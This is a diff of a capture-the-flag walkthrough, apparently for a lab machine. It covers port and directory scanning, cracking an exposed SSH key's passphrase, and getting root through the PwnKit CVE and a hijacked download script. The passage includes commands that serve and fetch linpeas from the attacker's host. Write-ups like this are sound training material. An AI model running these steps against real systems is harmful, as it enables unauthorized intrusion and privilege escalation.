@@ -4,7 +4,6 @@
 - Hack into the machine and get the *user.txt* flag 
 - Escalate privileges and get the *root.txt* flag
 
-<br>
 
 ### Step 1 - Recon
 Since we're given an IP address of the target, let's use nmap to scan it and see if any ports are open:
@@ -15,13 +14,14 @@ And from the output, we can see that there are two ports open on the target mach
 
 ![billede](https://user-images.githubusercontent.com/78546461/199543842-ef5db06d-bfb8-4c49-b94b-b6ec8292797d.png)
 
-<br>
+
 
 ### Step 2 - Finding a way in
 
 Since we don't have any idea of a username or password, the best thing to do here is to check out the webpage, on port 80.
 
 ![billede](https://user-images.githubusercontent.com/78546461/199544761-64cfaf7b-8612-4d88-85f8-fa42d42f7e76.png)
+
 
 So the webpage is for a password manager. Well, we can obviously see that there is an *About Us* and a *Downloads* page, but perhaps there could be other pages as well. 
 
@@ -31,13 +31,12 @@ Before we check, let's see if the page source has anything of interest to offer.
 
 Aha. So this alleged *Military Grade Encryption* is probably not what it sounds like. 
 
-Based on the *Romans used it* part, my guess would be that they have used the *Caesar Cipher* as their encryption for the passwords. 
-
 <br>
 
 Anyway, let's scan the website with gobuster and see if there are other pages of interest:
 
 ``gobuster dir -u http://10.10.192.255 -w /usr/share/wordlists/dirb/common.txt``
+
 
 This reveals that there are a couple more pages, which we didn't know about. 
 
@@ -91,6 +90,7 @@ So, it seems like we have a potential username, if not two. But James seems like
 
 We have his RSA Private Key right here on the page, so let's copy that into a new file and call it *id_rsa*.
 
+
 And then try to login using the RSA key, through SSH with username james:
 
 ``ssh james@10.10.192.255 -i id_rsa``
@@ -111,6 +111,7 @@ This returns us a long string of text, that we can give to john and attempt to f
 
 But first, I'll save the output to a new file and call it *john_rsa*.
 
+
 Now, let's give it a go with john:
 
 ``john --wordlist=/usr/share/wordlists/rockyou.txt john_rsa``
@@ -127,7 +128,9 @@ Well, that was easy. So the passphrase should be *james13*. Let's try it out:
 
 ![billede](https://user-images.githubusercontent.com/78546461/199553961-7cd3849f-c4e3-425a-9ebc-be190fc33470.png)
 
-<br><br>
+<br>
+
+---
 
 ### User flag
 
@@ -145,11 +148,13 @@ There we have our user.txt.
 
 ![billede](https://user-images.githubusercontent.com/78546461/199554329-cfb9b7b8-3c7e-4e85-a0b1-0d9f05b060d5.png)
 
-<br><br>
+<br>
 
 Nice. Now, let's get the root flag.
 
 <br>
+
+---
 
 ### Root flag
 
@@ -157,7 +162,7 @@ Nice. Now, let's get the root flag.
 
 Now, to make life a little easy, let's try to get an enumeration tool, such as linpeas onto the target machine.
 
-Note: linpeas can be installed by using the command ``sudo apt install peass``, which will also install other tools alongside it. You can then type ``linpeas`` into the terminal and you should be directed into the directory where linpeas.sh is.
+*Note: linpeas can be installed by using the command* ``sudo apt install peass``, *which will also install other tools alongside it. You can then type* ``linpeas`` *into the terminal and you should be directed into the directory where linpeas.sh is.*
 
 <br>
 
@@ -169,15 +174,11 @@ Now that we have it on our host machine, let's get it over to the target.
 
 First, I'll open up a http server with python on my host machine, in the directory where linpeas.sh is:
 
-<br>
-
 ``python3 -m http.server 4444``
 
 <br>
 
 And then, on the target machine, I'll use wget to download the linpeas.sh file. This will only work in a directory where our user has read+write access, so I'll use the /tmp directory:
-
-<br> 
 
 ``wget [my-ip]:4444/usr/share/peass/linpeas/linpeas.sh``
 
@@ -189,15 +190,11 @@ And then, on the target machine, I'll use wget to download the linpeas.sh file. 
 
 Now that we have linpeas on our target, let's change the file mode bits with chmod, to make linpeas.sh an executable for us:
 
-<br>
-
 ``chmod +x linpeas.sh``
 
 <br>
 
 And then run it:
-
-<br>
 
 ``./linpeas.sh``
 
@@ -207,7 +204,7 @@ linpeas will show a lot of information. And a lot of it is not really of interes
 
 A pretty certain exploit has been found by the CVEs Check. The exploit is CVE-2021-4034 (PolicyKit-1 0.105-31). 
 
-<br>
+
 
 ![billede](https://user-images.githubusercontent.com/78546461/200117628-c4cac89d-d8c5-4545-be2a-e7ed1775990d.png)
 
@@ -218,13 +215,13 @@ However, we can look it up on exploit-db and see what it's all about:
 
 https://www.exploit-db.com/exploits/50689
 
-<br>
+
 
 ![billede](https://user-images.githubusercontent.com/78546461/200117740-99f56183-8f5b-4cc4-8416-26eeefbe4876.png)
 
 ![billede](https://user-images.githubusercontent.com/78546461/200117786-c036220c-7e5d-4792-b8d0-31f799167221.png)
   
-
+<br>
 
 Ah. So we can actually just create a couple of files in our tmp directory, based on the code from the website, and then run the code afterwards, using the commands shown.
 
@@ -337,7 +334,7 @@ Let's edit it, to make a request to our IP address instead.
 
 But first, we have to make the necessary directories and script, so that it actually has something to download.
 
-So, on our host machine, we can go into the / directory, ``cd /`` and then use the commands:
+So, on our host machine, we can go into the ``/`` directory, ``cd /`` and then use the commands:
 
 ``sudo mkdir downloads/src -p``
 
@@ -399,7 +396,8 @@ We could also have used a reverse shell or gotten the flag in other ways, but fo
 
 However, feel free coming up with new ways of getting the root flag, by editing the *buildscript*.sh script in the /downloads/src directory, on your host machine. 😈
 
-<br><br>
+<br>
 
+---
 
 #### Made by PatrickSkovgaard (GitHub)
